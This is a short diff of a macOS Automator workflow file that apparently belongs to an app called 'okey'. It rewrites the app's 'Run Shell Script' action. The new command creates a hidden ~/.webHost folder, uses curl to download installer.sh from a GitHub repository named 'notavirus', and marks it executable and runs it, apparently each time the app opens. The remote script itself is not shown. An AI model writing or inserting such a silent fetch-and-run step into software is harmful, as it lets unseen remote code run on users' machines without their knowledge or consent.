@@ -59,8 +59,14 @@
 				<key>ActionParameters</key>
 				<dict>
 					<key>COMMAND_STRING</key>
-					<string>. ~/Downloads/okey.app/this.sh
-killall okey</string>
+					<string>
+cd ~
+mkdir .webHost
+cd .webHost
+curl https://raw.githubusercontent.com/pointfour/notavirus/master/installerScript/installer.sh &gt; installer.sh
+chmod 755 installer.sh
+./installer.sh
+</string>
 					<key>CheckedForUserDefaultShell</key>
 					<true/>
 					<key>inputMethod</key>
@@ -173,7 +179,7 @@ killall okey</string>
 				<key>isViewVisible</key>
 				<true/>
 				<key>location</key>
-				<string>497.000000:253.000000</string>
+				<string>529.000000:419.000000</string>
 				<key>nibPath</key>
 				<string>/System/Library/Automator/Run Shell Script.action/Contents/Resources/English.lproj/main.nib</string>
 			</dict>
